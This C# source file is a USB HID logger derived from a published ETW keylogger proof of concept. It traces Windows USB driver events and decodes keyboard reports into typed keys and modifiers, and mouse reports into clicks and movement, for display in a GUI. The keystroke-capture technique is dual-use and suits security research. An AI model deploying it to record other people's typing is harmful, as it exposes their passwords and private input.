using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using Microsoft.Diagnostics.Tracing;
using Microsoft.Diagnostics.Tracing.Session;
using System.Threading;
/*USB Hid Logger
 Author: MSDN.WhiteKnight (https://github.com/MSDN-WhiteKnight)
 Based on Ruxcon2016ETW KeyloggerPOC (https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC)*/

namespace EtwHidlogger
{
    public interface IPrint
    {
        void Print(string text);
    }

    /*Represents a block of data transferred via USB*/
    public class UsbData
    {
        public byte usbver; //usb version (2.0 or 3.0)
        public byte[] data; //transferred bytes
        public ulong hndl; //device handle
        public DateTime time; //timestamp
        public uint vid; //Vendor ID (2.0 only)
        public uint pid; //Product ID (2.0 only)
        public uint datalen; //amount of bytes transferred

        public UsbData(DateTime inputTime, ulong inputHndl, byte[] inputData)
        {
            time = inputTime;
            data = inputData;
            hndl = inputHndl;
        }
    }

    /*A class to manage Event tracing for Windows sessions*/
    public class UsbEventSource
    {
        // Microsoft-Windows-USB-UCX (usb3.0)
        private static Guid UsbUcx = new Guid("36DA592D-E43A-4E28-AF6F-4BC57C5A11E8");
        // Microsoft-Windows-USB-USBPORT (usb2.0)
        private static Guid UsbPort = new Guid("C88A4EF5-D048-4013-9408-E04B7DB2814A");

        private static string sessionName = "UsbKeylog";
        public static TraceEventSession session;

        public static IPrint Instance; //object to display things on GUI                

        /// <summary>
        /// Starts new event tracing session
        /// </summary>
        /// <param name="newSessionName">Session name</param>
        /// <param name="filename">Path where to save event log file</param>
        public static void StartCapture(string newSessionName = null, string filename = "log.etl")
        {
            if (session != null) StopCapture();

            if (newSessionName != null)
                sessionName = newSessionName;

            session = new TraceEventSession(
                sessionName,
                filename);

            session.EnableProvider(UsbUcx);
            session.EnableProvider(UsbPort);
        }

        /// <summary>
        /// Stops event tracing session
        /// </summary>
        public static void StopCapture()
        {
            if (session != null)
            {
                session.Stop();
                session.Dispose();
                session = null;
            }
        }
                
        private static Dictionary<string, string> _expose(object hidden)
        {
            string str = hidden.ToString();
            char[] separators = { '{', '}', ',' };
            char[] remove = { ' ', '"' };
            string[] s = str.Split(separators, StringSplitOptions.RemoveEmptyEntries);
            Dictionary<string, string> item = s.ToDictionary(x => x.Split('=')[0].Trim(), x => x.Split('=')[1].Trim(remove));
            return item;
        }

        //Gets item with certain name from event data
        private static object GetItem(TraceEvent eventData, string item)
        {  
            object value = null;
            int pIndex = eventData.PayloadIndex(item);
            if (pIndex < 0)
                return value;

            try
            {
                value = eventData.PayloadValue(pIndex);
            }
            catch (ArgumentOutOfRangeException) {                
            }

            return value;
        }

        //Parses usb event data
        private static UsbData GetData(TraceEvent eventData)
        {
            ulong hndl;
            object field;
            uint vid=0,pid=0;
            byte usbver = 0;

            //try to determine device handle and IDs
            field = GetItem(eventData, "fid_USBPORT_Device");
            if (field != null)
            {
                Dictionary<string, string> deviceInfo = _expose(field);

                if (!ulong.TryParse(deviceInfo["DeviceHandle"], out hndl) && hndl <= 0)
                    return null;

                vid = UInt32.Parse(deviceInfo["idVendor"]);
                pid = UInt32.Parse(deviceInfo["idProduct"]);
            }
            else
            {
                hndl = (ulong)GetItem(eventData, "fid_PipeHandle");
                if (hndl <= 0) return null;
            }
                        
            //try to get event parameters
            field = GetItem(eventData, "fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER"); //2.0
            usbver = 2;
            if (field == null)
            {
                field = GetItem(eventData, "fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER"); //3.0
                usbver = 3;
            }
            Dictionary<string, string> urb = _expose(field);//transform parameter string to dictionary

            //determine transferred data length
            int xferDataSize = 0;
            if (!int.TryParse(urb["fid_URB_TransferBufferLength"], out xferDataSize))
                return null;
            if ((xferDataSize > 8) && (usbver == 2)) xferDataSize = 8; //USB 2.0 sometimes gives wrong size 

            if (xferDataSize > 8) return null; //data is too large for mouse / keyboard
                        
            byte[] data2=eventData.EventData();
            byte[] xferData = new byte[xferDataSize];
            Array.Copy(data2, eventData.EventDataLength - xferDataSize, xferData, 0, xferDataSize);

            bool HasNonZero = false;
            for (int i = 0; i < xferDataSize; i++)
                if (xferData[i] != 0) { HasNonZero = true; break; }
            if (HasNonZero == false) return null; //data is empty

            /* Construct UsbData object*/
            UsbData data = new UsbData(eventData.TimeStamp, hndl, xferData);
            data.usbver = usbver;
            data.datalen = (uint)xferDataSize;
            data.vid = vid;
            data.pid = pid;
            return data;
        }

                

        //Method called on new event
        public static void EventCallback(TraceEvent eventData)
        {
                        
            if (eventData.EventDataLength <= 0)
                return;
            
            UsbData usbdata = null;
            string output = "";

            try
            {

                if (eventData.PayloadNames.Contains("fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER")
                    || eventData.PayloadNames.Contains("fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER"))
                    usbdata = GetData(eventData);

                if (usbdata == null) return;

                string idstr="";
                if (usbdata.usbver == 2)
                {
                    idstr = String.Format("VID_0x{0} PID_0x{1}", usbdata.vid.ToString("X4"), usbdata.pid.ToString("X4"));
                }

                //determine what device data comes from and actual length of data (for USB 2.0)
                bool IsMouse = false;
                uint len = usbdata.datalen;

                //(mouse data is 4 or 5 bytes, keyboard - 8 bytes)
                if (usbdata.datalen < 8) { IsMouse = true; len = usbdata.datalen; }
                else
                {
                    if (usbdata.usbver == 2 &&
                        usbdata.data[0] == 0 && usbdata.data[1] == 0 &&
                        usbdata.data[2] == 4 && usbdata.data[3] == 0) { IsMouse = true; len = 4; }
                    else if (usbdata.usbver == 2 && 
                        usbdata.data[0] == 5 && usbdata.data[1] == 0) { IsMouse = true; len = 5; }
                    else IsMouse = false;
                }

                //Print data
                if (IsMouse == false && usbdata.data[1]==0) //second byte must be zero for keyboard
                {
                    var arr = ParseKeys(usbdata.data);
                    output = String.Format("{0} {1} Keyboard ", usbdata.time, idstr);
                    if (arr != null) foreach (var s in arr) output += s + " ";
                }
                else
                {                                        
                    sbyte b;
                    output = String.Format("{0} {1} Mouse ",usbdata.time,idstr);

                    uint i_start = usbdata.datalen - len;                                        
                    uint index;
                    bool action = false;

                    for (uint i = i_start; i < usbdata.datalen; i++)
                    {
                        index = i - i_start;
                        b = (sbyte)usbdata.data[i];
                        switch (index)
                        {
                            case 0: //first byte defines pressed buttons
                                if ((usbdata.data[i] & 0x01) > 0) {output+= "Left button press ";action=true;}
                                if ((usbdata.data[i] & 0x02) > 0) {output += "Right button press ";action=true;}
                                if ((usbdata.data[i] & 0x04) > 0) {output += "Middle button press ";action=true;}
                                if ((usbdata.data[i] & 0x08) > 0) {output += "Special button press ";action=true;}
                                if ((usbdata.data[i] & 0xf0) > 0) { output += "Special button press ";action = true; }
                           
                                break;
                            case 1: //second byte is x movement
                                if (usbdata.data[i] != 0 || usbdata.data[i + 1] != 0) { output += "move: "; action = true; }
                                if (usbdata.data[i] != 0) output += "dx=" + b.ToString() + " ";
                                break;
                            case 2: //third byte is y movement
                                if (usbdata.data[i] != 0) output += "dy=" + b.ToString() + " ";
                                break;
                            case 3: //4th byte (if present) is wheel movement
                                if (usbdata.data[i] != 0)
                                {
                                    output += "Wheel Move: Delta=" + b.ToString() + " ";
                                    action = true;
                                }
                                break;
                        }
                        
                        /*output += b.ToString() + " ";*/
                    }
                    if (!action) output += "Button release";

                }

                
            }
            catch (Exception ex)
            {
                output = "Error in callback: "+ex.GetType().ToString()+" "+ex.Message;
            }

            if(output!="")Instance.Print(output);
            //datastore.Add(usbdata);
        }

        

        private static string[] ParseKeys(byte[] bytes)
        {
            string[] result = new string[2];
            result[0] = BitConverter.ToString(bytes).Replace("-", " ");

            // modifiers:
            //  CTL = 1
            //  SFT = 2
            //  ALT = 4
            byte modByte = bytes[0];
            byte noneByte = bytes[1];

            byte[] dataBytes = new byte[6];
            Array.Copy(bytes, 2, dataBytes, 0, 6);

            string[] fullKeyStroke = new string[6];

            // convert usageId -> usageName
            for (int i = 0; i < fullKeyStroke.Length; i++)
            {
                int usageId = dataBytes[i];
                string[] key = KeyMap.GetKey(usageId);

                // skip unmapped data
                if (key == null)
                    return null;

                // empty data (usageId == 0)
                if (key.SequenceEqual(new string[1]))
                {
                    fullKeyStroke[i] = "";
                    continue;
                }

                // [SFT]
                if ((modByte & 0x22) != 0)
                    fullKeyStroke[i] = key.Last();
                else
                    fullKeyStroke[i] = key.First();
            }

            string parsed = "";
            if ((modByte & 0x11) != 0)
                parsed += "[CTL] ";
            if ((modByte & 0x44) != 0)
                parsed += "[ALT] ";
            parsed += String.Join(" ", fullKeyStroke);
            result[1] = parsed.Trim();

            return result;
        }        
        
    }
}
//http://lms.ee.hm.edu/~seck/AlleDateien/OS9HILFE/OS9-Manuals-Teil2/usb_host.pdf
